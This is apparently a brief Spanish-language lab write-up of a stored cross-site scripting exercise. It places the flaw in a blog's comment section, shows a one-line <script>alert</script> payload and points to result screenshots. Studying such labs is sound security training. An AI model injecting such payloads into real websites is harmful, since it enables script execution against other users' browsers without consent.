# Stored XSS into HTML context with nothing encoded 👨‍💻
<p align="center">
    <img src="/assets/XSS/02-Second/01-Description.PNG">
</p>
La vulnerabilidad se encuentra en **la sección de comentarios de los posts** 
<p align="center">
    <img src="/assets/XSS/02-Second/02-Script.PNG">
</p>

**Script XSS**
```js
<script>alert("Pwned!");</script>
```

Una vez ejecutamos la búsqueda con el anterior script obtenemos el siguiente resultado:
<p align="center">
    <img src="/assets/XSS/02-Second/03-Result.PNG">
</p>